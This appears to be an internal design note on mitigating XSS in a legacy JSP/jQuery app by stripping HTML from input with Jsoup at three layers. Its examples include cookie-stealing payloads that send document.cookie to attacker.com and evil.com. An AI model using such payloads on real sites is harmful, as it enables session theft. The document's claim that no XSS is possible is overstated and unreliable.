# XSS Protection Implementation for Legacy Application

**Subject:** XSS Vulnerability Mitigation - Implementation Details

---

## Executive Summary

Our application uses jQuery's `.html()` method in over 700 locations to dynamically load content. This method directly inserts HTML into the DOM without escaping, making it highly vulnerable to Cross-Site Scripting (XSS) attacks. We've implemented a comprehensive 3-layer protection strategy that sanitizes all user input before it reaches the browser, without requiring changes to existing code.

---

## The Problem

### Current Architecture
1. User accesses `/home` which loads `main.jsp` (full HTML page)
2. After that, the app behaves as a Single Page Application (SPA)
3. All content is loaded via AJAX into a `#main-content` div using jQuery's `.html()` method
4. JSP fragments (like `fundTransferForm.jsp`) contain user data embedded in `${...}` expressions

### The Vulnerability

**Example Attack Scenario:**

A malicious user submits this as their name:
```
<script>
  // Steal session and send to attacker
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>John Doe
```

**Without protection, here's what happens:**

```javascript
// Our code (one of 700+ similar calls)
$.get('/user/profile', function(response) {
    $('#main-content').html(response);  // Inserts HTML directly
});
```

The JSP returns:
```html
<div class="profile">
    <h2>Welcome, <script>fetch('http://attacker.com/...')</script>John Doe</h2>
</div>
```

**Result:** The script executes, user session is stolen. This can happen in any of our 700+ `.html()` calls.

---

## The Solution: 3-Layer Input Sanitization

Instead of trying to fix 700+ `.html()` calls or change JSP expressions, we sanitize **all user input** at three entry points before it reaches the JSPs.

### Architecture Overview

```
User Input (Malicious)
        ↓
    [Layer 1: Request Parameter Filter]
    Sanitizes: Query params, form data
        ↓
    [Layer 2: Request Body Advice]
    Sanitizes: JSON/XML request bodies
        ↓
    [Controller Processing]
        ↓
    [Layer 3: Model Sanitizer Interceptor] ← KEY COMPONENT
    Sanitizes: Model attributes before JSP renders
        ↓
    [JSP Rendering]
    ${userName} now contains clean data
        ↓
    [HTML Response]
        ↓
    [jQuery .html() Method]
    Inserts safe HTML into DOM
        ↓
    ✅ No XSS possible
```

---

## Layer 3: XssModelSanitizerInterceptor - The Critical Protection

This is the final defense layer that specifically protects against XSS in our `.html()` calls.

### How It Works

**Interceptor runs AFTER controller but BEFORE JSP renders:**

```java
@Component
public class XssModelSanitizerInterceptor implements HandlerInterceptor {
    
    @Override
    public void postHandle(HttpServletRequest request, 
                          HttpServletResponse response,
                          Object handler, 
                          ModelAndView modelAndView) {
        
        // Get all model attributes
        ModelMap model = modelAndView.getModelMap();
        
        // Sanitize each attribute (strips ALL HTML)
        model.forEach((key, value) -> {
            Object sanitized = sanitizeObject(value);
            model.put(key, sanitized);
        });
    }
}
```

### Step-by-Step Protection Flow

**Step 1: Malicious Input Received**
```java
// Controller adds user data to model
@GetMapping("/user/profile")
public String showProfile(Model model) {
    String userName = userService.getName();  
    // userName = "<script>alert('XSS')</script>John"
    
    model.addAttribute("userName", userName);
    return "profileFragment";  // Returns JSP fragment
}
```

**Step 2: Interceptor Sanitizes (BEFORE JSP renders)**
```java
// XssModelSanitizerInterceptor.postHandle() executes here
// Input:  model.userName = "<script>alert('XSS')</script>John"
// Output: model.userName = "John"  ← All HTML stripped
```

**Step 3: JSP Renders Clean Data**
```jsp
<!-- profileFragment.jsp -->
<div class="profile">
    <h2>Welcome, ${userName}</h2>
    <!-- Outputs: <h2>Welcome, John</h2> -->
    <!-- NO script tag present! -->
</div>
```

**Step 4: jQuery Loads Fragment Safely**
```javascript
// Our existing code (unchanged)
$.get('/user/profile', function(html) {
    $('#main-content').html(html);
    // Inserts: <div class="profile"><h2>Welcome, John</h2></div>
    // ✅ Safe! No malicious script to execute
});
```

## Concrete Example: Fund Transfer Form

### Scenario: Attacker tries XSS via account name

**Attack Input:**
```json
POST /account/create
{
  "accountName": "<img src=x onerror='fetch(\"http://evil.com?data=\"+document.cookie)'>Savings"
}
```

**What Happens:**

1. **Layer 2 (XssRequestBodyAdvice)** sanitizes request body:
   ```
   BEFORE: "<img src=x onerror='...'>Savings"
   AFTER:  "Savings"
   ```

2. **Controller** processes clean data:
   ```java
   @PostMapping("/account/create")
   public String create(@RequestBody AccountDTO account, Model model) {
       accountService.save(account);  // Saves "Savings"
       model.addAttribute("accountName", account.getName());  // "Savings"
       return "accountCreated";
   }
   ```

3. **Layer 3 (XssModelSanitizerInterceptor)** double-checks before JSP:
   ```
   BEFORE JSP: model.accountName = "Savings" (already clean)
   AFTER:      model.accountName = "Savings" (verified clean)
   ```

4. **JSP** renders:
   ```jsp
   <!-- accountCreated.jsp -->
   <div class="success">
       <p>Account created: ${accountName}</p>
       <!-- Output: <p>Account created: Savings</p> -->
   </div>
   ```

5. **jQuery** loads fragment:
   ```javascript
   $.post('/account/create', data, function(html) {
       $('#main-content').html(html);
       // Safe! No XSS code present
   });
   ```

**Result:** ✅ Attack blocked at Layer 2, verified at Layer 3, safe HTML delivered to browser.

- `Safelist.none()` strips ALL HTML from user input
- Clear separation of concerns

## Implementation Components

### 1. XssRequestParamFilter
- **Purpose:** Sanitize query parameters and form data
- **Example:** `/search?q=<script>` → `q=""` (empty)

### 2. XssRequestBodyAdvice
- **Purpose:** Sanitize JSON/XML request bodies
- **Example:** `{"name": "<script>"}` → `{"name": ""}`

### 3. XssModelSanitizerInterceptor (Critical for .html() protection)
- **Purpose:** Sanitize model attributes before JSP rendering
- **Example:** `model.add("user", "<script>")` → `model.user=""` before JSP sees it

## Technical Details

### Sanitization Method
- **Library:** Jsoup 1.17.2
- **Strategy:** `Safelist.none()` - strips ALL HTML tags
- **Input:** `"<script>alert('XSS')</script>Hello"`
- **Output:** `"Hello"`

### Configuration
- Filter runs at `HIGHEST_PRECEDENCE` (before all other filters)
- Interceptor runs after controller, before view rendering
- Excludes static resources (CSS, JS, images)
